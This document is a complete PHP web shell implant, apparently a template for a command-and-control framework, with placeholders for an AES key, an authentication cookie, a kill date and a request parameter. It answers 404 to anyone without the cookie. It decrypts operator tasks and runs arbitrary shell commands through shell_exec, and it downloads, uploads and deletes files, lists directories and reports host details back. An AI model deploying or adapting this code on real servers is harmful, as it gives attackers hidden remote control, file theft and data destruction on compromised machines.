<span id="task_response">
<?php
$encryption_key = "%AESPSK%";
$cookie_value = "%UUID%";
$cookie_name = "%COOKIE%";
$killdate = strtotime("%KILLDATE%");


function encrypt($plaintext, $password) {
    $method = "AES-256-CBC";
    if($password !== ""){
        $key = base64_decode($password);
        $iv = openssl_random_pseudo_bytes(16);
        $ciphertext = openssl_encrypt($plaintext, $method, $key, $options=OPENSSL_RAW_DATA, $iv);
        $hash = hash_hmac('sha256',   $iv . $ciphertext, $key, true);
        return $iv . $ciphertext . $hash;
    }
    return $plaintext;

}
function check_date(){
	global $killdate;
	if( time() >= $killdate){
		return false;
	}
	return true;
}
function abort_call(){
	http_response_code(404);
	echo "</span>";
	die();
}
function base64url_decode($data, $strict = false)
{
  // Convert Base64URL to Base64 by replacing “-” with “+” and “_” with “/”
  $b64 = strtr($data, '-_', '+/');
  return base64_decode($b64, $strict);
}
function decrypt($ivHashCiphertext, $password) {
    if($password !== ""){
        $method = "AES-256-CBC";
        $iv = substr($ivHashCiphertext, 0, 16);
        $hash = substr($ivHashCiphertext, -32);
        $ciphertext = substr($ivHashCiphertext, 16,  -32);
        $key = base64_decode($password);
        if (!hash_equals(hash_hmac('sha256', $iv . $ciphertext, $key, true), $hash)) return "error";
        return openssl_decrypt($ciphertext, $method, $key, $options=OPENSSL_RAW_DATA, $iv);
    } else {
        return $ivHashCiphertext;
    }

}
function return_message($message){
    global $encryption_key;
    return base64_encode( encrypt( $message, $encryption_key ) );
}
// make sure our auth cookie is there
if(!isset($_COOKIE["%COOKIE%"])){
	abort_call();
}
// make sure our auth cookie is set to the right value
if($_COOKIE["%COOKIE%"] != base64_encode($cookie_value)){
	abort_call();
}
function list_directory($path){
    // check if directory exists and is readable
    if (!is_dir($path) || !is_readable($path)) {
        return "Error: Directory '$path' does not exist or is not readable.";
    }
    
    try {
        $files = scandir($path);
        $output = "Listing contents of: " . realpath($path) . "\n";
        $output .= "\tUID\tGID\tSize\tMTime\tName\n";
        
        foreach ($files as $item) {
            $fullPath = $path . "/" . $item;
            // check if each file is readable
            if (is_readable($fullPath)) {
                $curFile = stat($fullPath);
                $curOutput = $curFile["uid"] . "\t" . $curFile["gid"] . "\t" . $curFile["size"] . "Bytes \t" . date("Y-m-d\TH:i:s\Z", $curFile["mtime"]) . "\t" . $item;
                $output .= "\n" . $curOutput;
            } else {
                $output .= "\nPermission denied: $item";
            }
        }
        return $output;
    } catch (Exception $e) {
        return "Error: " . $e->getMessage();
    }
}
function remove_file($path){
	if( unlink($path) ){
		return "Removed file";
	}
	return "Failed to remove file";
}
function checkin(){
	// format is IP|OS|User|Host|Domain|PID|Arch
	$host = gethostname();
	$ip = gethostbyname($host);
	$arch = php_uname('m');
	$user = get_current_user();
	$pid = getmypid();
	$os = php_uname();
	return $ip . "|" . $os . "|" . $user . "|" . $host . "|" . "" . "|" . $pid . "|" . $arch . "|";
}
function upload($path, $data){
	$fh = fopen($path, 'w');
	if( $fh === false ){
		return "Failed to write file";
	}
	fwrite($fh, $data);
	fclose($fh);
	return "Successfully wrote file";
}
function download($path){
	$content = file_get_contents($path);
	if( $content === false){
		return "Failed to get contents of file";
	}
	return base64_encode($content);
}
function process_message($full_message){
	if( !check_date() ){
		abort_call();
	}
	http_response_code(200);
	global $encryption_key;

	$decrypted_message = decrypt( $full_message, $encryption_key );
	//echo $decrypted_message;
	$pieces = explode("|", $decrypted_message);
	//echo count($pieces);
	if( count($pieces) < 2 ){
	    if(count($pieces) > 0){
	        return $pieces[0] . "|" . "wrong number of pieces";
	    }
		return "|wrong number of pieces";
	}
	$task_id = $pieces[0];
	$command = base64_decode($pieces[1]);
	$output = "";
	switch($command){
		case "shell":
			$output = shell_exec(base64_decode($pieces[2]) );
			break;
		case "pwd":
			$output = getcwd();
			break;
		case "checkin":
			$output = checkin();
			break;
		case "download":
			$output = download(base64_decode($pieces[2]));
			break;
		case "ls":
			$output = list_directory(base64_decode($pieces[2]));
			break;
		case "rm":
			$output = remove_file(base64_decode($pieces[2]));
			break;
		case "upload":
			$output = upload(base64_decode($pieces[2]), base64_decode($pieces[3]));
			break;
	}
	return $task_id . "|" . $output;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw_body = file_get_contents('php://input');
    $full_message = base64url_decode( $raw_body );
    $full_message = substr($full_message, 36);
    $response = process_message($full_message);
    echo return_message($response);
} else if(isset($_GET["%PARAM%"])){
	$full_message = base64url_decode( $_GET["%PARAM%"] );
	$full_message = substr($full_message, 36);
	$response = process_message($full_message);
	echo return_message($response);
}else{
    abort_call();
}
?>
</span>
